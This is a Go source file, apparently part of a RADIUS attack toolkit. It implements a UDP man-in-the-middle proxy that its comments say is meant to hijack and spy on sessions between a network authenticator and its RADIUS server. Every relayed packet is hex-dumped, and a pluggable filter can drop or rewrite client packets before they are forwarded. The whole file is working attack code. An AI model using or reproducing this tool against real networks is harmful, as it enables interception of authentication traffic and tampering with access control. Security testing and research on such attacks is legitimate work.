package session

import (
	"encoding/hex"
	"fmt"
	"net"
	"radius/packet"
	"radius/utils"
	"strconv"
)

type FilterFunc func(packet packet.RadiusPacket) (bool, packet.RadiusPacket)

//Session between host and guest to be hijacked.
//The attacker must be placed between the authenticator and the authenticator server.
//hostName is the target RADIUS authenticator
type Session struct {
	hostName string //Target RADIUS server
	ports    []int  //Target ports
}

type udpData struct {
	buff       []byte
	senderAddr net.UDPAddr
	dstPort    int
}

type clientData struct {
	clientAddr net.UDPAddr
	connection *net.UDPConn
	mappedPort int //Port in case that direct mapping is not possible (port already in use)
}

const protocol = "udp"

//Receives UDP packets and writes the result in a channel for asyncronous management of the packets
func (session *Session) receiveUDPPacket(conn *net.UDPConn, dstPort int, channel chan udpData) {

	buff := make([]byte, 2048)

	for {
		n, addr, err := conn.ReadFromUDP(buff)
		if n > 0 {
			res := make([]byte, n)
			// Copy the buffer so it doesn't get changed while read by the recipient.
			copy(res, buff[:n])

			udpData := udpData{
				buff:       res,
				senderAddr: *addr,
				dstPort:    dstPort,
			}

			channel <- udpData
		}
		if err != nil {
			close(channel)
			break
		}
	}

}

func (session *Session) setupUDPServer(port int) *net.UDPConn {

	addrToListen := ":" + strconv.FormatUint(uint64(port), 10)

	//Build the address
	localAddr, err := net.ResolveUDPAddr(protocol, addrToListen)

	if err != nil {
		fmt.Println("Wrong Address")
		return nil
	}

	clientConn, err := net.ListenUDP(protocol, localAddr)

	if err != nil {
		fmt.Println("Error", err)
		return nil
	}

	return clientConn

}

//HijackSession In order to spy the communications between authenticator and authenticator server
func (session *Session) HijackSession(filterFunc FilterFunc) {

	var clients []clientData

	udpChan := make(chan udpData)
	serverConnections := make(map[int]*net.UDPConn)

	for _, port := range session.ports {

		serverConn := session.setupUDPServer(port)
		serverConnections[port] = serverConn
		go session.receiveUDPPacket(serverConn, port, udpChan) //Start receiving packets from client towards the RADIUS server

	}

	for {

		//Packet received
		data, more := <-udpChan

		//Channel closed (Problems with one of the sides)
		if !more {
			fmt.Println("Something went wrong...")
			break
		}

		fmt.Println("Message from", data.senderAddr, "to port:", data.dstPort)

		fmt.Println(hex.Dump(data.buff))

		//Forward packet

		if data.senderAddr.IP.Equal(net.ParseIP(
			session.hostName)) && utils.Contains(session.ports, data.senderAddr.Port) { //Came from authenticator server RADIUS

			fmt.Println("From authenticator server")

			//Check if address already seen
			for _, client := range clients {
				if client.mappedPort == data.dstPort {
					fmt.Println("Send to client", client.clientAddr)
					serverConnections[data.senderAddr.Port].WriteToUDP(data.buff, &client.clientAddr) //Redirect to client
					break
				}
			}

		} else { //From authenticator

			fmt.Println("From authenticator ")

			found := false

			var client clientData

			//Check if address already seen
			for _, client = range clients {
				if client.clientAddr.IP.Equal(data.senderAddr.IP) && client.clientAddr.Port == data.senderAddr.Port {
					fmt.Println("Client found.")
					found = true
					break
				}
			}

			if !found {
				//Create client

				fmt.Println("Client not found. Creating... ")

				//Determine free port

				freePort := false
				mappedPort := data.senderAddr.Port //First we try with the sender's port

				for !freePort {
					freePort = true
					for _, client := range clients {
						if client.mappedPort == mappedPort {
							freePort = false
							mappedPort++ //Try next port
							break
						}
					}

				}

				localAddr := net.UDPAddr{
					//IP: net.IPv4(0, 0, 0, 0)
					Port: mappedPort,
				}

				authAddr, err := net.ResolveUDPAddr(protocol, session.hostName+":"+strconv.FormatUint(uint64(data.dstPort), 10))

				if err != nil {
					fmt.Println("Error authAddr ", err)
					return
				}

				conn, err := net.DialUDP(protocol, &localAddr, authAddr)

				if err != nil {
					fmt.Println("Error net.DialUDP ", err)
					return
				}

				client = clientData{
					clientAddr: data.senderAddr,
					connection: conn,
					mappedPort: mappedPort,
				}

				clients = append(clients, client)

				go session.receiveUDPPacket(client.connection, mappedPort, udpChan) //Start receiving packets from radius server

			}

			fmt.Println("Sending to Radius Server...", client.connection.RemoteAddr().String())

			var incomingPacket packet.RadiusPacket

			incomingPacket.Decode(data.buff)

			filterPassed, filterPacket := filterFunc(incomingPacket)

			if filterPassed {
				client.connection.Write(filterPacket.Encode()) //Redirect to server
			}

		}

	}

}
